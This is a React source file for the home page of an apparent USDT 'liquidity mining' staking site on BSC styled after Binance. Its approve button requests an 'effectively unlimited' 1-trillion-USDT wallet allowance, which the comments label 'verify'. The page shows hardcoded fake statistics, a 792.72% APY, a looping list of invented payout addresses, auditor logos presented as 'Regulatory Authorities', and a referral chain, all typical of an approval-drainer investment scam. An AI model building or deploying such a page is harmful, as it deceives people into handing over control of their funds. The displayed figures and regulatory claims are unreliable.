'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { CounterAnimation } from '@/components/CounterAnimation'
import { EnhancedButton } from '@/components/EnhancedButton'
import { RefreshCWIcon } from '@/components/RefreshCWIcon'
import { ParticleBackground } from '@/components/ParticleBackground'
import PartnersSection from '@/components/PartnersSection'
import LanguageSelector from '@/components/LanguageSelector'
import { useUserProfile } from '@/hooks/useData'
import { useI18n } from '@/contexts/I18nContext'
import { isMobileDevice, isInWalletBrowser, getWalletType, getFriendlyErrorMessage } from '@/lib/wallet-utils'
import BottomNavigation, { BottomSpacer } from '@/components/BottomNavigation'
import { CURRENT_NETWORK } from '@/lib/contracts'
import { Button } from '@/components/ui/button'
import { EnhancedAnnouncementModal } from '@/components/EnhancedAnnouncementModal'
import HexagonLoader, { HexagonLoaderInline } from '@/components/HexagonLoader'
import StakingModal from '@/components/StakingModal'
import { useWeb3Staking } from '@/hooks/useWeb3Staking'
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'

export default function Home() {
  // 状态管理
  const [isLoading, setIsLoading] = useState(false)
  const [announcements, setAnnouncements] = useState<any[]>([])
  const [showAnnouncement, setShowAnnouncement] = useState(false)
  const [currentAnnouncementIndex, setCurrentAnnouncementIndex] = useState(0)
  const [faqOpen, setFaqOpen] = useState(false)
  const [showStakingModal, setShowStakingModal] = useState(false)

  // 使用AppKit hooks
  const { open } = useAppKit()
  const { address: account, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()
  
  // 检查是否在BSC网络 (chainId 56是BSC主网，97是BSC测试网)
  const chainIdNum = typeof chainId === 'string' ? parseInt(chainId) : (typeof chainId === 'number' ? chainId : 0)
  const isOnBSC = chainIdNum === 56 || chainIdNum === 97
  
  // Web3质押功能
  const { 
    usdtBalance, 
    usdtAllowance, 
    approveUsdt, 
    stakeUsdt,
    refetchUsdtBalance,
    refetchUsdtAllowance
  } = useWeb3Staking()
  
  // 国际化
  const { t } = useI18n()

  // 获取用户数据
  const { userProfile, isLoading: isProfileLoading, refetch: refetchProfile } = useUserProfile(account)
  
  // 质押相关数据
  const stakedAmount = userProfile?.usdt || 0        // 质押金额
  const rewardAmount = userProfile?.cash || 0        // 奖励金额
  const totalInvestment = userProfile?.totalInvestment || 0  // 总投资
  const totalRewards = userProfile?.totalRewards || 0       // 总奖励
  
  // 计算verify状态 - 只有在BSC网络且verify额度大于0时才认为已verify
  const isAuthorized = isConnected && isOnBSC && usdtAllowance && parseFloat(usdtAllowance) > 0

  // 添加调试信息
  useEffect(() => {
    console.log('🔍 Authorization Debug:', {
      isConnected,
      isOnBSC,
      chainId,
      chainIdNum,
      chainIdType: typeof chainId,
      isBSCMainnet: chainIdNum === 56,
      isBSCTestnet: chainIdNum === 97,
      usdtAllowance,
      usdtAllowanceParsed: parseFloat(usdtAllowance || '0'),
      isAuthorized,
      account
    })
  }, [isConnected, isOnBSC, chainId, chainIdNum, usdtAllowance, isAuthorized, account])

  // 真实统计数据，使用默认值
  const stats = {
    totalUsers: 15420,
    totalInvestment: 2850000,
    totalRewards: 428500,
    activeMiners: 8920
  }

  // 云矿池数据
  const poolData = {
    hashRate: '156.8 EH/s',
    efficiency: '98.5%',
    uptime: '99.9%',
    minersOnline: 8920
  }

  const currentUsdtPrice = 1.00  // USDT价格固定为1美元

  // 移动端钱包检测
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const mobile = isMobileDevice()
      const inWallet = isInWalletBrowser()
      const walletType = getWalletType()
      
      console.log('📱 移动端钱包检测:', {
        isMobile: mobile,
        isInWalletBrowser: inWallet,
        walletType,
        hasEthereum: !!(window as any).ethereum,
        userAgent: navigator.userAgent
      })
    }
  }, [])

  // 获取公告数据
  useEffect(() => {
    if (account) {
      fetchAnnouncements()
    }
  }, [account])

  const fetchAnnouncements = async () => {
    try {
      const response = await fetch(`/api/announcements?user_address=${account}`)
      if (response.ok) {
        const result = await response.json()
        if (result.success && result.data.announcements.length > 0) {
          setAnnouncements(result.data.announcements)
          setCurrentAnnouncementIndex(0)
          setShowAnnouncement(true)
        }
      }
    } catch (error) {
      console.error('获取公告失败:', error)
    }
  }

  const handleAnnouncementClose = () => {
    if (currentAnnouncementIndex < announcements.length - 1) {
      // 还有更多公告，显示下一条
      setCurrentAnnouncementIndex(prev => prev + 1)
    } else {
      // 所有公告都显示完了，关闭弹窗
      setShowAnnouncement(false)
      setAnnouncements([])
      setCurrentAnnouncementIndex(0)
    }
  }

  // Handle approve button click
  const handleApprove = async () => {
    if (!isConnected) {
      console.log('🔗 Wallet not connected, starting connection...')
      await open()
      return
    }

    // 检查是否在BSC网络
    if (!isOnBSC) {
      alert(t.pleaseSwitchToBsc + ' (BSC主网: 56, BSC测试网: 97)')
      console.log('❌ Not on BSC network, current chainId:', chainId, 'chainIdNum:', chainIdNum)
      return
    }

    console.log('⚠️ Starting unlimited USDT approval...')
    console.log('📊 Current state:', {
      isConnected,
      isOnBSC,
      chainId,
      account,
      usdtAllowance
    })
    
    setIsLoading(true)
    
    try {
      // Unlimited approval (using max value)
      const maxAmount = '1000000000000' // 1 trillion, effectively unlimited
      console.log('💰 Approving amount:', maxAmount)
      
      await approveUsdt(maxAmount)
      console.log('✅ Unlimited approval successful')
      
      // Wait a moment for blockchain confirmation
      setTimeout(async () => {
        // Refresh approval status
        await refetchUsdtAllowance()
        console.log('🔄 Allowance refreshed')
      }, 2000)
      
      alert(t.approvalSuccessful)
      
    } catch (error) {
      console.error('❌ Approval failed:', error)
      const friendlyMessage = getFriendlyErrorMessage(error)
      alert(`${t.approvalFailed}: ${friendlyMessage}`)
    } finally {
      setIsLoading(false)
    }
  }

  // Handle stake button click - opens staking modal
  const handleStake = async () => {
    if (!isConnected) {
      console.log('🔗 Wallet not connected, starting connection...')
      await open()
      return
    }

    if (!isAuthorized) {
      alert(t.pleaseApproveUsdt)
      return
    }

    // Open staking modal for user to input amount
    setShowStakingModal(true)
  }

  // 打开钱包信息弹窗
  const openWalletModal = () => {
    open({ view: 'Account' })
  }

  return (
    <div className="min-h-screen relative" style={{ 
      backgroundImage: "url('/bg-prelaunched-mobile.svg')",
      backgroundSize: 'cover',
      backgroundPosition: 'center',
      backgroundRepeat: 'no-repeat'
    }}>
      <ParticleBackground />
      
      {/* Header */}
      <header className="flex items-center justify-between p-4 frosted-glass border-b border-border/20 text-[#000000] bg-[#f9f900] font-bold relative z-[11000]">
        <div className="flex items-center gap-4">
          <img 
            src="/icons/hedaer/logo.png" 
            alt="Logo" 
            className="h-8 w-auto slide-in-up"
          />
          <LanguageSelector variant="compact" className="slide-in-up" />
        </div>
        <div className="flex items-center gap-4">
          {/* 显示钱包错误信息 */}
          {/* {walletError && (
            <div className="text-red-600 text-xs max-w-xs truncate">
              {walletError}
            </div>
          )} */}
          {isConnected ? (
            <Button 
              onClick={() => open({ view: 'Account' })}
              className="bg-[#f9f900] hover:bg-[#e0e000] text-black border border-black/20 rounded-lg shadow-sm"
            >
              {account && account.length >= 10 ? `${account.slice(0, 6)}...${account.slice(-4)}` : t.disconnectWallet}
            </Button>
          ) : (
            <Button 
              onClick={() => open()}
              disabled={isLoading}
              className="bg-[#f9f900] hover:bg-[#e0e000] text-black border border-black/20 rounded-lg shadow-sm"
            >
              {isLoading ? t.connectingWallet : t.connectWallet}
            </Button>
          )}
        </div>
      </header>

      {/* Binance Anniversary Style Video Hero Section */}
      <section className="relative py-4 px-4 bg-gradient-to-b from-[#F0B90B] to-[#FCD535] z-[100]">
        <div className="max-w-6xl mx-auto">
          {/* 币安8周年庆风格视频边框 */}
          <div className="binance-frame flex h-[400px] md:h-[500px]">
            {/* 左侧边框 */}
            <div className="flex flex-col w-[14px]">
              <div 
                className="h-4" 
                style={{ 
                  backgroundImage: "url('/fragments/frame-left-corner-mobile.svg')",
                  backgroundSize: 'contain',
                  backgroundRepeat: 'no-repeat' 
                }}
              ></div>
              <div 
                className="flex flex-1 bg-[#1E1E1E] items-center" 
                style={{ borderLeft: '1px solid rgb(252, 234, 156)' }}
              >
                <img 
                  className="w-full h-full object-cover" 
                  src="/fragments/left-gradient.svg" 
                  alt="Left gradient"
                />
              </div>
            </div>

            {/* 中间视频区域 */}
            <div className="flex flex-col flex-1">
              {/* 顶部边框 */}
              <div className="flex w-full">
                <div 
                  className="flex-1 h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-top-left-mobile.svg')",
                    backgroundSize: 'cover',
                    backgroundRepeat: 'repeat-x' 
                  }}
                ></div>
                <div 
                  className="w-[150px] bg-no-repeat bg-cover h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-top-center-mobile.svg')" 
                  }}
                ></div>
                <div 
                  className="flex-1 h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-top-right-mobile.svg')",
                    backgroundSize: 'cover',
                    backgroundRepeat: 'repeat-x' 
                  }}
                ></div>
              </div>

              {/* 视频内容 */}
              <div className="flex-1 bg-[#1E1E1E] relative overflow-hidden">
                <video 
                  autoPlay 
                  loop 
                  muted 
                  playsInline
                  className="w-full h-full object-cover"
                  style={{ visibility: 'visible' }}
                >
                  <source src="/bg-landing-mobile.mp4" type="video/mp4" />
                  {/* 视频加载失败时的备用图片 */}
                </video>
                


                {/* 金色粒子效果 */}
                <div className="absolute inset-0 pointer-events-none">
                  <div className="particles-container">
                    {[...Array(20)].map((_, i) => (
                      <div 
                        key={i}
                        className="particle"
                        style={{
                          left: `${(i * 5.26) % 100}%`, // 使用固定计算替代 Math.random()
                          animationDelay: `${(i * 0.15) % 3}s` // 使用固定计算替代 Math.random()
                        }}
                      ></div>
                    ))}
                  </div>
                </div>
              </div>

              {/* 底部边框 */}
              <div className="flex w-full">
                <div 
                  className="flex-1 h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-bottom-left-mobile.svg')",
                    backgroundSize: 'cover',
                    backgroundRepeat: 'repeat-x' 
                  }}
                ></div>
                <div 
                  className="w-[150px] bg-no-repeat bg-cover h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-bottom-center-mobile.svg')" 
                  }}
                ></div>
                <div 
                  className="flex-1 h-[6px]" 
                  style={{ 
                    backgroundImage: "url('/fragments/frame-bottom-right-mobile.svg')",
                    backgroundSize: 'cover',
                    backgroundRepeat: 'repeat-x' 
                  }}
                ></div>
              </div>
            </div>

            {/* 右侧边框 */}
            <div className="flex flex-col w-[14px]">
              <div 
                className="h-4" 
                style={{ 
                  backgroundImage: "url('/fragments/frame-right-corner-mobile.svg')",
                  backgroundSize: 'contain',
                  backgroundRepeat: 'no-repeat' 
                }}
              ></div>
              <div 
                className="flex flex-1 bg-[#1E1E1E] items-center" 
                style={{ borderRight: '1px solid rgb(252, 234, 156)' }}
              >
                <img 
                  className="w-full h-full object-cover" 
                  src="/fragments/right-gradient.svg" 
                  alt="Right gradient"
                />
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Combined Staking & Mining Data Section */}
      <section className="py-4 px-3 md:py-8 md:px-4 bg-gradient-to-b from-[#F0B90B] to-[#FCD535]">
        <div className="max-w-4xl mx-auto">
          {/* Frame Tablet 背景容器 */}
          <div className="relative w-full max-w-[640px] mx-auto" style={{ 
            backgroundImage: "url('/fragments/frame-tablet.svg')",
            backgroundSize: '100% 100%',
            backgroundRepeat: 'no-repeat',
            backgroundPosition: 'center',
            minHeight: '856px',
            aspectRatio: '640/856'
          }}>
                        {/* 上半部分 - 质押卡片内容 */}
            <div className="absolute top-[20px] left-[20px] right-[20px]" style={{ height: '400px' }}>
              <div className="h-full p-3 md:p-4">
                {/* 钱包连接状态 */}
                <div className="flex items-center justify-between mb-3 md:mb-4">
                <div className="flex items-center gap-2 md:gap-3">
                  <div className="w-8 h-8 md:w-16 md:h-16 flex items-center justify-center">
                    <img src="/icons/binance-icon.png" alt="USDT" className="w-8 h-8 md:w-16 md:h-16" />
                  </div>
                  <div>
                    <div className="text-lg md:text-3xl font-bold text-white">
                      <CounterAnimation end={stakedAmount} decimals={2} suffix=" USDT" className="counter-text" />
                    </div>
                    <div className="text-xs md:text-sm text-muted-foreground mt-0.5 md:mt-1">
                      已获奖励: <span className="text-green-400 font-medium">
                        <CounterAnimation end={rewardAmount} decimals={2} suffix=" USDT" />
                      </span>
                    </div>
                  </div>
                </div>
                <div className="flex flex-col gap-1.5 md:gap-2">
                  {!isConnected ? (
                    <EnhancedButton 
                      onClick={() => open()}
                      disabled={isLoading}
                      className="bg-[#eab308] text-black hover:bg-primary/90 font-bold rounded-[16px] md:rounded-[24px] text-sm md:text-[19px] px-4 py-2.5 md:px-[30px] md:py-[25px]"
                    >
                      {isLoading ? (
                        <div className="flex items-center gap-1.5 md:gap-2">
                          <HexagonLoaderInline className="scale-[0.3] md:scale-50" />
                          <span>Connecting...</span>
                        </div>
                      ) : 'Connect Wallet'}
                    </EnhancedButton>
                  ) : (
                    <div className="flex flex-col gap-1.5 md:gap-2">
                      {!isAuthorized ? (
                        <EnhancedButton 
                          onClick={handleApprove}
                          disabled={isLoading}
                          className="bg-[#f59e0b] text-black hover:bg-[#d97706] font-bold rounded-[16px] md:rounded-[24px] text-sm md:text-[16px] px-4 py-2 md:px-[25px] md:py-[20px]"
                        >
                          {isLoading ? (
                            <div className="flex items-center gap-1.5 md:gap-2">
                              <HexagonLoaderInline className="scale-[0.3] md:scale-50" />
                              <span>Approving...</span>
                            </div>
                          ) : 'Approve USDT'}
                        </EnhancedButton>
                      ) : (
                        <EnhancedButton 
                          onClick={handleStake}
                          disabled={isLoading}
                          className="bg-[#10b981] text-black hover:bg-[#059669] font-bold rounded-[16px] md:rounded-[24px] text-sm md:text-[16px] px-4 py-2 md:px-[25px] md:py-[20px]"
                        >
                          {isLoading ? (
                            <div className="flex items-center gap-1.5 md:gap-2">
                              <HexagonLoaderInline className="scale-[0.3] md:scale-50" />
                              <span>Processing...</span>
                            </div>
                          ) : 'Stake USDT'}
                        </EnhancedButton>
                      )}
                      
                      {/* Display current status */}
                      <div className="text-[10px] md:text-xs text-center text-muted-foreground">
                        {isAuthorized ? (
                          <span className="text-green-400">✅ Approved</span>
                        ) : (
                          <span className="text-yellow-400">⚠️ Need Approval</span>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Middle Row: Three Stats with clear separation */}
              <div className="grid grid-cols-3 gap-0 mb-3 md:mb-6 border-t border-b border-border/20 py-2 md:py-4">
                <div className="text-left border-r border-border/20 pr-2 md:pr-4 slide-in-up">
                  <div className="text-[10px] md:text-xs text-muted-foreground mb-0.5 md:mb-1">{t.rewardPool}</div>
                  <div className="text-xs md:text-sm font-bold text-[#eab308] counter-text">
                    <CounterAnimation end={stats.totalRewards || 144129961.86} decimals={2} suffix=" USDT" />
                  </div>
                </div>
                <div className="text-center border-r border-border/20 px-2 md:px-4 slide-in-up" style={{ animationDelay: '0.2s' }}>
                  <div className="text-[10px] md:text-xs text-muted-foreground mb-0.5 md:mb-1">{t.playerIncome}</div>
                  <div className="text-xs md:text-sm font-bold text-green-400 counter-text">
                    <CounterAnimation end={poolData.efficiency ? parseFloat(poolData.efficiency) : 1046324402.00} decimals={2} suffix=" %" />
                  </div>
                </div>
                <div className="text-right pl-2 md:pl-4 slide-in-up" style={{ animationDelay: '0.4s' }}>
                  <div className="text-[10px] md:text-xs text-muted-foreground mb-0.5 md:mb-1">{t.usdtPrice}</div>
                  <div className="text-xs md:text-sm font-bold text-[#00ffff]">
                    <CounterAnimation end={currentUsdtPrice} decimals={2} suffix=" USD" className="counter-text" />
                  </div>
                </div>
              </div>

              {/* Bottom Row: Two Stats with clear separation */}
              <div className="grid grid-cols-2 gap-0">
                <div className="border-r border-border/20 pr-2 md:pr-4 slide-in-up" style={{ animationDelay: '0.6s' }}>
                  <div className="text-[10px] md:text-xs text-muted-foreground mb-0.5 md:mb-1">{t.walletBalance}:</div>
                  <div className="flex items-center gap-1 md:gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32" className="md:w-6 md:h-6 inline">
                      <linearGradient id="wallet-grad1" x1="16" x2="16" y1="5.25" y2="27.432" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopColor="#66c4c4" />
                        <stop offset="1" stopColor="#009393" />
                      </linearGradient>
                      <path fill="url(#wallet-grad1)" fillRule="evenodd" d="M7.534,5.313h17.28c0.412,0,0.793,0.214,0.999,0.56	l5.034,8.486c0.261,0.44,0.183,0.996-0.189,1.352l-13.857,13.28c-0.449,0.43-1.171,0.43-1.62,0L1.342,15.73	c-0.381-0.365-0.452-0.937-0.172-1.38l5.381-8.504C6.761,5.515,7.133,5.313,7.534,5.313z" clipRule="evenodd" />
                      <linearGradient id="wallet-grad2" x1="16" x2="16" y1="5.313" y2="29.314" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad2)" d="M30.846,14.359l-5.034-8.486	c-0.206-0.347-0.587-0.56-0.999-0.56H7.534c-0.401,0-0.773,0.202-0.982,0.533L1.17,14.35c-0.28,0.443-0.209,1.015,0.172,1.38	l13.838,13.262c0.224,0.215,0.517,0.323,0.81,0.323c0.293,0,0.586-0.108,0.81-0.323l13.857-13.28	C31.03,15.355,31.107,14.799,30.846,14.359z M30.485,15.531l-13.857,13.28c-0.17,0.163-0.397,0.253-0.637,0.253	c-0.24,0-0.467-0.09-0.637-0.253L1.515,15.549c-0.296-0.284-0.351-0.722-0.134-1.065L6.763,5.98	c0.163-0.257,0.458-0.417,0.771-0.417h17.28c0.323,0,0.624,0.168,0.784,0.438l5.034,8.486	C30.833,14.826,30.772,15.256,30.485,15.531z" />
                      <linearGradient id="wallet-grad3" x1="16.025" x2="16.025" y1="8.539" y2="22.472" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad3)" d="M17.91,12.585V11.42h4.672	c0.138,0,0.25-0.112,0.25-0.25V8.789c0-0.138-0.112-0.25-0.25-0.25H9.469c-0.138,0-0.25,0.112-0.25,0.25v2.381	c0,0.138,0.112,0.25,0.25,0.25h4.673v1.165c-2.837,0.168-6.043,0.783-6.07,2.006v1.816c0.027,1.216,3.233,1.831,6.07,2v3.814	c0,0.138,0.112,0.25,0.25,0.25h3.269c0.138,0,0.25-0.112,0.25-0.25v-3.814c2.837-0.169,6.043-0.785,6.069-2.006v-1.815	C23.953,13.368,20.747,12.753,17.91,12.585z M16.025,16.677c-3.619,0-6.253-0.581-7.141-1.181c0.692-0.471,2.479-0.961,5.257-1.126	v1.464c0,0.133,0.104,0.243,0.237,0.25c1.057,0.055,2.235,0.055,3.294,0c0.133-0.007,0.237-0.117,0.237-0.25V14.37	c2.778,0.165,4.563,0.655,5.257,1.126C22.278,16.096,19.646,16.677,16.025,16.677z" />
                      <path fill="#fff" fillRule="evenodd" d="M17.66,12.821V11.17h4.922V8.789H9.469v2.381h4.922v1.651	c-3.457,0.176-6.051,0.901-6.07,1.77l0,1.811c0.019,0.869,2.613,1.593,6.07,1.77v4.051h3.268V18.17	c3.457-0.176,6.051-0.901,6.07-1.77l0-1.811C23.711,13.722,21.117,12.997,17.66,12.821z M16.026,16.927	c-3.689,0-6.773-0.613-7.528-1.431c0.64-0.694,2.955-1.24,5.893-1.39v1.728c0.527,0.027,1.073,0.041,1.634,0.041	c0.561,0,1.108-0.014,1.634-0.041v-1.728c2.939,0.15,5.253,0.696,5.893,1.39C22.799,16.314,19.715,16.927,16.026,16.927z" clipRule="evenodd" />
                    </svg>
                    <span className="text-sm md:text-lg font-bold text-white">
                      <CounterAnimation end={parseFloat(usdtBalance || '0')} decimals={2} suffix=" USDT" className="counter-text" />
                    </span>
                    <RefreshCWIcon size={14} className="md:w-5 md:h-5 text-muted-foreground" />
                  </div>
                </div>
                <div className="pl-2 md:pl-4 slide-in-up" style={{ animationDelay: '0.8s' }}>
                  <div className="text-[10px] md:text-xs text-muted-foreground mb-0.5 md:mb-1">{t.stakingAPY}:</div>
                  <div className="flex items-center gap-1 md:gap-2">
                    <Badge className="bg-blue-600 text-white text-xs md:text-sm px-2 py-0.5 md:px-3 md:py-1 font-bold rounded transition-all duration-300 hover:bg-blue-500 hover:scale-105 counter-text">
                      792.72 %
                    </Badge>
                    <RefreshCWIcon size={14} className="md:w-5 md:h-5 text-muted-foreground" />
                  </div>
                </div>
              </div>
            </div>
            
            {/* 下半部分 - Liquidity Mining Data 表格 */}
            <div className="absolute bottom-[20px] left-[20px] right-[20px]" style={{ height: '380px' }}>
              <div className="h-full p-4">
                <h3 className="text-lg md:text-xl font-bold text-white mb-4 text-center">Liquidity Mining Data</h3>
                
                {/* 简洁表格样式 */}
                <div className="bg-black/60 backdrop-blur-sm rounded-lg border border-yellow-500/30 overflow-hidden">
                  <table className="w-full text-white">
                    <tbody>
                      <tr className="border-b border-yellow-500/20 hover:bg-yellow-500/10 transition-colors">
                        <td className="py-3 px-4 text-yellow-400 text-sm">Total Production</td>
                        <td className="py-3 px-4 text-right font-bold">
                          <CounterAnimation end={330006.385} decimals={3} suffix=" USDT" className="counter-text" />
                        </td>
                      </tr>
                      <tr className="border-b border-yellow-500/20 hover:bg-yellow-500/10 transition-colors">
                        <td className="py-3 px-4 text-yellow-400 text-sm">Effective Nodes</td>
                        <td className="py-3 px-4 text-right font-bold">
                          <CounterAnimation end={179081.626} decimals={3} className="counter-text" />
                        </td>
                      </tr>
                      <tr className="border-b border-yellow-500/20 hover:bg-yellow-500/10 transition-colors">
                        <td className="py-3 px-4 text-yellow-400 text-sm">Participant Number</td>
                        <td className="py-3 px-4 text-right font-bold">
                          <CounterAnimation end={478371} className="counter-text" />
                        </td>
                      </tr>
                      <tr className="hover:bg-yellow-500/10 transition-colors">
                        <td className="py-3 px-4 text-yellow-400 text-sm">User Income</td>
                        <td className="py-3 px-4 text-right font-bold">
                          <CounterAnimation end={196319.294} decimals={3} suffix=" USDT" className="counter-text" />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Liquidity Mining Output */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text">Liquidity Mining Output</h3>

          {/* Headers outside card */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm mb-4">
            <div className="font-semibold text-muted-foreground">Address</div>
            <div className="font-semibold text-muted-foreground text-right">Amount</div>
          </div>

          {/* Card with scrollable content */}
          <div className="bg-[#400040] rounded-[30px] glass-effect overflow-hidden">
            <div className="h-96 overflow-hidden relative">
              {/* Auto-scrolling content */}
              <div className="animate-scroll space-y-2 p-6">
                {[
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                  // Duplicate entries for continuous scroll effect
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                ].map((item, index) => (
                  <div key={`${item.address}-${index}`} className="grid grid-cols-2 gap-2 py-2 border-b border-border/30 transition-all duration-300 hover:bg-white/5 hover:scale-[1.02]">
                    <div className="text-muted-foreground font-mono text-sm">{item.address}</div>
                    <div className="text-right font-semibold text-primary counter-text">{item.amount}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* My Activity */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">My Activity</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            Please enter the amount of staking corresponding to the end time
          </p>

          <div className="text-center py-12">
            <img
              src="https://ext.same-assets.com/590002659/3331183233.png"
              alt="No Data"
              className="w-24 h-24 mx-auto mb-4 opacity-50 floating"
            />
            <div className="text-muted-foreground slide-in-up">No Data</div>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">FAQ</h3>

          <Card className="frosted-glass transition-all duration-300 hover:scale-[1.02] cursor-pointer">
            <CardContent className="p-6">
              <div className="flex items-center justify-between" onClick={() => setFaqOpen(!faqOpen)}>
                <span className="text-lg">Are there any rewards for inviting friends?</span>
                <span className={`text-primary transition-transform duration-300 ${faqOpen ? 'rotate-180' : ''}`}>▼</span>
              </div>
              {faqOpen && (
                <div className="mt-4 pt-4 border-t border-border/20 slide-in-up">
                  <p className="text-muted-foreground leading-relaxed">
                    Yes, you can invite your friends to join the mining pool through your link. You can get USDT rewards from the mining pool while participating in the friend invitation chain.
                  </p>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Regulatory Authorities */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">Regulatory Authorities</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            We have global regulatory authorities
          </p>

          <div className="grid grid-cols-3 gap-3 md:gap-6">
            <Card className="bg-white p-4 md:p-6 floating shadow-md hover:shadow-lg transition-all duration-300">
              <img
                src="https://ext.same-assets.com/590002659/396665122.png"
                alt="FairyProof"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="bg-white p-4 md:p-6 floating shadow-md hover:shadow-lg transition-all duration-300" style={{ animationDelay: '2s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2552246351.png"
                alt="Certik"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="bg-white p-4 md:p-6 floating shadow-md hover:shadow-lg transition-all duration-300" style={{ animationDelay: '4s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2879882895.png"
                alt="SlowMist"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
          </div>
        </div>
      </section>

      {/* Cooperative Platform */}
      <PartnersSection />

      {/* Bottom Navigation */}
      <BottomNavigation />
      <BottomSpacer />
      
      {/* Enhanced announcement modal */}
      {announcements.length > 0 && (
        <EnhancedAnnouncementModal
          isOpen={showAnnouncement}
          onClose={handleAnnouncementClose}
          announcements={announcements}
          currentIndex={currentAnnouncementIndex}
          userAddress={account}
        />
      )}

      {/* Staking Modal */}
      {showStakingModal && (
        <StakingModal
          isOpen={showStakingModal}
          onClose={() => setShowStakingModal(false)}
          usdtBalance={usdtBalance}
          isLoading={isLoading}
          isAuthorized={Boolean(isAuthorized)}
          onConfirm={async (amount: string) => {
            try {
              setIsLoading(true)
              await stakeUsdt(amount)
              alert(`✅ Successfully staked ${amount} USDT!`)
              await refetchUsdtBalance()
              setShowStakingModal(false)
            } catch (error) {
              console.error('❌ Staking failed:', error)
              const friendlyMessage = getFriendlyErrorMessage(error)
              alert(`❌ Staking failed: ${friendlyMessage}`)
            } finally {
              setIsLoading(false)
            }
          }}
        />
      )}
    </div>
  )
}
